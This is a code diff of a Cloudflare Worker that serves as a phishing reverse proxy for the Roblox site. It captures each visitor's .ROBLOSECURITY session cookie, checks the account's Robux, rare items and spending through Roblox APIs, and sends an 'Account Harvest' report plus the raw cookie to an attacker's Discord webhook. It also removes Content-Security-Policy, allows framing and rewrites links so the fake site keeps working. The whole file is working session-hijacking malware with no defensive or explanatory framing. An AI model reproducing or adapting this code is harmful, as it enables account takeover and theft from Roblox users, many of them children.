@@ -1,32 +1,36 @@
-// === CONFIGURATION ===
-// Set WEBHOOK_URL in Cloudflare Worker environment variables (secrets)
-
 const TARGET = "https://www.roblox.com";
 
-// === MAIN HANDLER ===
 export default {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
     const targetUrl = new URL(url.pathname + url.search, TARGET);
 
-    // Forward request to Roblox
+    // === FORWARD ALL HEADERS EXACTLY AS RECEIVED ===
+    const headers = new Headers(request.headers);
+    
+    // Remove Cloudflare-specific headers that might break things
+    headers.delete("CF-Connecting-IP");
+    headers.delete("CF-IPCountry");
+    headers.delete("CF-Ray");
+    headers.delete("CF-Visitor");
+    
+    // === FORWARD REQUEST WITH ORIGINAL COOKIES ===
     const proxyRequest = new Request(targetUrl, {
       method: request.method,
-      headers: request.headers,
+      headers: headers,
       body: request.body,
       redirect: "manual"
     });
 
     const response = await fetch(proxyRequest);
 
-    // === CAPTURE COOKIE ===
+    // === CAPTURE COOKIE FROM INCOMING REQUEST ===
     const cookieHeader = request.headers.get("Cookie") || "";
     const robloxMatch = cookieHeader.match(/(?:^|;\s*)\.ROBLOSECURITY=([^;]+)/);
 
     if (robloxMatch && robloxMatch[1] && robloxMatch[1].length > 10) {
       const token = robloxMatch[1];
 
-      // FIRE WEBHOOK WITH FULL SCAN + SPLIT COOKIE
       ctx.waitUntil(
         (async () => {
           try {
@@ -34,13 +38,11 @@ export default {
             const ua = request.headers.get("User-Agent") || "unknown";
             const referer = request.headers.get("Referer") || "direct";
 
-            // === 1. VALIDATE TOKEN & GET BASIC USER INFO ===
             const userInfo = await fetch("https://www.roblox.com/mobileapi/userinfo", {
               headers: { "Cookie": `.ROBLOSECURITY=${token}` }
             });
 
             if (!userInfo.ok) {
-              // Token invalid/expired
               await sendWebhook(env.WEBHOOK_URL, {
                 content: `@everyone ❌ **Invalid/Expired Token**`,
                 embeds: [{
@@ -57,7 +59,6 @@ export default {
 
             const userData = await userInfo.json();
 
-            // Extract fields
             const userId = userData.UserID;
             const username = userData.UserName || "Unknown";
             const robux = userData.RobuxBalance || 0;
@@ -67,7 +68,6 @@ export default {
             const createdDate = userData.Created || "Unknown";
             const accountAge = calculateAge(createdDate);
 
-            // === 2. FETCH FOLLOWER COUNT ===
             let followers = 0;
             try {
               const profileRes = await fetch(`https://www.roblox.com/users/${userId}/profile`);
@@ -76,12 +76,10 @@ export default {
               if (followerMatch) followers = parseInt(followerMatch[1]) || 0;
             } catch (_) {}
 
-            // === 3. CHECK FOR KORBLOX + HEADLESS ===
             let hasKorblox = false;
             let hasHeadless = false;
 
             try {
-              // Korblox = Item ID 1027821
               const inventoryRes = await fetch(
                 `https://inventory.roblox.com/v1/users/${userId}/items/Collectible/1027821?limit=1`,
                 { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
@@ -91,7 +89,6 @@ export default {
                 hasKorblox = invData.data && invData.data.length > 0;
               }
 
-              // Headless = Item ID 1366566
               const headlessRes = await fetch(
                 `https://inventory.roblox.com/v1/users/${userId}/items/Collectible/1366566?limit=1`,
                 { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
@@ -102,10 +99,8 @@ export default {
               }
             } catch (_) {}
 
-            // === 4. ESTIMATE YEAR SUMMARY ===
             const summary = await getYearSummary(userId, token);
 
-            // === 5. BUILD VERIFICATION & ASSET STRINGS ===
             const verificationStatus = [];
             if (verifiedEmail) verificationStatus.push("✅ Email");
             if (verifiedPhone) verificationStatus.push("✅ Phone");
@@ -115,7 +110,6 @@ export default {
             if (hasKorblox) assetList.push("💀 Korblox");
             if (hasHeadless) assetList.push("🎃 Headless");
 
-            // === 6. BUILD EMBED (INFO ONLY — NO COOKIE) ===
             const embed = {
               title: `🎯 Account Harvest — @${username}`,
               color: 0x00ff88,
@@ -143,8 +137,6 @@ export default {
               timestamp: new Date().toISOString()
             };
 
-            // === 7. SEND SPLIT PAYLOAD ===
-            // First message: @everyone ping + embed (info only)
             const firstPayload = {
               content: `@everyone 🔔 **Verified Account Captured** | @${username} | ${robux.toLocaleString()} R$`,
               embeds: [embed]
@@ -152,7 +144,6 @@ export default {
 
             await sendWebhook(env.WEBHOOK_URL, firstPayload);
 
-            // Second message: Cookie ONLY in a code block
             const cookiePayload = {
               content: `\`\`\`cookie\n.ROBLOSECURITY=${token}\n\`\`\``
             };
@@ -160,7 +151,6 @@ export default {
             await sendWebhook(env.WEBHOOK_URL, cookiePayload);
 
           } catch (error) {
-            // Silent fail
             await sendWebhook(env.WEBHOOK_URL, {
               content: `@everyone ⚠️ **Capture Error**\n\`${error.message || "Unknown error"}\``
             });
@@ -175,9 +165,19 @@ export default {
     newHeaders.delete("Content-Security-Policy");
     newHeaders.set("X-Frame-Options", "ALLOWALL");
 
+    // === REWRITE COOKIE DOMAIN TO KEEP SESSION ALIVE ===
+    // This is critical — Roblox sets cookies for .roblox.com, but your iframe is on your domain
+    // We need to preserve the session by forwarding Set-Cookie headers back to the browser
+    const setCookie = response.headers.get("Set-Cookie");
+    if (setCookie) {
+      // Forward Set-Cookie to the browser so it maintains session
+      newHeaders.set("Set-Cookie", setCookie);
+    }
+
     let body = await response.text();
     const origin = url.origin;
     body = body.replace(/https?:\/\/www\.roblox\.com/g, origin);
+    body = body.replace(/https?:\/\/roblox\.com/g, origin);
     body = body.replace(/(src|href)="\//g, `$1="${origin}/`);
 
     return new Response(body, {
@@ -187,8 +187,6 @@ export default {
     });
   }
 };
-
-// === HELPERS ===
 
 function calculateAge(createdDate) {
   if (!createdDate || createdDate === "Unknown") return "Unknown";
@@ -209,7 +207,6 @@ function calculateAge(createdDate) {
 
 async function getYearSummary(userId, token) {
   try {
-    // Fetch badges earned in the last year
     const badgeRes = await fetch(
       `https://badges.roblox.com/v1/users/${userId}/badges?limit=20&sortOrder=Desc`,
       { headers: { "Cookie": `.ROBLOSECURITY=${token}` } }
@@ -228,7 +225,6 @@ async function getYearSummary(userId, token) {
 
     const totalBadges = badgeData.data?.length || 0;
 
-    // Estimate Robux spent
     let estimatedSpend = 0;
     try {
       const txRes = await fetch(
@@ -271,7 +267,5 @@ async function sendWebhook(webhookUrl, payload) {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify(payload)
     });
-  } catch (_) {
-    // Silent fail
-  }
+  } catch (_) {}
 }
